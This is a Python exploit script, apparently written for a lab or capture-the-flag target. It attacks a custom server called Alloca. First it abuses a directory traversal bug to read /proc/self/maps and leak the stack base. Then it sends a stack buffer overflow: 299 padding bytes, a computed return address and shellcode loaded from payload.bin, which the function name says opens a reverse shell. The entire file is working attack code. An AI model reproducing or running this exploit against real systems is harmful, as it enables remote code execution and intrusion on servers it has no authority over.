import socket
import time
import struct
import colorama
import os


def connect_reverse_shell(host, port, cwd = "buffer_overflow"):
    """
    Leaks the stackbase, prepares the payload and sends the exploit
    """
    stack_base = leak_stack_base(host, port)

    if stack_base is None:
        print(colorama.Fore.RED + "[!] Failed to leak stackbase!")
        return

    print("[i] found stack base at 0x%x" % stack_base)
    shellcode = None

    try:
        with open(os.path.join(cwd, 'payload.bin'), 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        print(colorama.Fore.RED + "[!] Failed to find payload at '%s'!" % os.path.join(cwd, 'payload.bin'))
        return

    #     -------- 300 -------
    # HTTP AAA     ...     AAA<return><shellcode>
    ret = stack_base + 0x7fce88
    req = b"HTTP " + b"A" * 299 + struct.pack("<I", ret) + shellcode
    send_request(req, host, port)


def send_request(payload, host, port, ignore_response = True):
    """
    Sends a request
    """
    print("[i] Connecting to %s:%d" % (host, port))

    # Create a socket and connect to it
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.sendall(payload)
    print("[i] Sent payload: %r" % payload)

    time.sleep(0.5)
    sock.shutdown(socket.SHUT_WR)

    if ignore_response:
        sock.close()
        return None

    # read response
    res = ""

    while True:
        data = sock.recv(1024)
        if not data:
            break
        res += data.decode()

    sock.close()
    return res


def leak_stack_base(host, port):
    '''
    This function tries to find the base adress of the stack using a directory traversal bug
    We can access /proc/self/maps which holds the memory regions of Alloca
    The stack usually falls into memory region 6a0?????-6a8?????
    We use rwxp to check that we have indeed found the stack, since there are always non-
    executable memory region agains the stack.
    '''
    # Make use of the directory traversal bug to get memory maps
    res = send_request(b"GET ../../proc/self/maps HTTP", host, port, False)
    stack_base = None

    # Search through memory regions for base adress of Alloca thread
    for line in res.split('\n'):
        # 6a0?????-6a8????? rwxp ???
        if not (line.startswith('6a0') and "-6a8" in line and " rwxp " in line):
            continue

        stack_base = int(line.split('-')[0], 16)
        break

    # Fallback when stack base is not found, take 30th row and hope for the best
    if stack_base is None:
        print(colorama.Fore.YELLOW + "[!] Stack base not in expected range,\ falling back to fixed address.")

        try:
            line = res.split('\n')[30]
        except IndexError:
            print(colorama.Fore.RED + "[!] Fallback failed: Memory map is shorter than expected!")
        else:
            stack_base = int(line.split('-')[0], 16)

    return stack_base
